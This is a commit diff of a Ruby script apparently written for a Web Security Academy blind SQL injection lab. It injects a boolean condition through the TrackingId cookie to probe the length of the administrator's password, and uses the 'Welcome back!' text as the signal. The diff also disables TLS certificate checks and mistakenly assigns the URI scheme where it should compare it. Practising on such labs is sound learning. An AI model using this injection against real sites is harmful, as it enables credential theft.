a2e0c79ddb57aa43b170458002e8697d3b880d4d
jbk2 <james@humanbenefits.com>
2026-01-08 16:17:07 +0100

    methods for fetching and valid TrackingID response signal checking now working

--- sql/lab11.rb
+++ sql/lab11.rb
@@ -1,29 +1,29 @@
 require 'uri'
 require 'net/http'
+require 'openssl'
 
 SESSION_COOKIE = "rYjXpryytVRhVOZaS4Th1QtvGCfczSHg"
-TRACKING_ID = "G9z8hNrmTzEUiFDR"
-BASE_URI = "https://0a6e003a043b291e81d99dd60081008c.web-security-academy.net/"
+TRACKING_ID = "iOiUpdGkE7gfW0eR"
+BASE_URI = URI("https://0abe00430482f05584fd634a004300d0.web-security-academy.net/")
+
 CHARS = ('a'..'z').to_a.concat((0..9).to_a)
 ASCII_RANGE = (32..126)
 
 def http_client
-  http = NET::HTTP.new(BASE_URI, BASE_URI.port)
-  http.use_ssl = (base.scheme = "https")
+  http = Net::HTTP.new(BASE_URI.host, BASE_URI.port)
+  http.use_ssl = (BASE_URI.scheme = "https")
+  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
   http.open_timeout = 5
   http.read_timeout = 10
   http
 end
 
-def built_request(request_uri, injected_tracking_id)
-  req = Net:HTTP::Get.new(request_uri)
+def built_request(injected_tracking_id)
+  req = Net::HTTP::Get.new(BASE_URI.request_uri)
   req["Accept"] = "text/html"
   req["Cookie"] = "TrackingId=#{injected_tracking_id}; session=#{SESSION_COOKIE}"
   req
 end
-
-
-
 
 def sql_password_length(operator, length)
   "#{TRACKING_ID}' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) #{operator} #{length})='a"
@@ -41,12 +41,17 @@ def password_length?
   # from 1..30 call sql_password_length
 end
 
+def fetch(injected_tracking_id = TRACKING_ID)
+  response = http_client.request(built_request(injected_tracking_id))
 
-def fetch
-  response = http_client.request(built_request)
-
-  puts "Status: #{res.code} #{res.message}"
-  puts "Content-Type: #{res['content-type']}"
-  puts "Body bytes: #{res.body.bytesize}"
-  puts res.body[0, 300]
+  puts response.code == '200' ? "Status: ✅ #{response.code} #{response.message}" : "Status: ❌ #{response.code} #{response.message}"
+  puts "Content-Type: #{response['content-type']}"
+  puts "Body bytes: #{response.body.bytesize}"
+  puts welcome_back_present?(response.body) ? "Valid" : "Invalid"
 end
+
+def welcome_back_present?(response_body)
+  response_body.include?("Welcome back!")
+end
+
+fetch
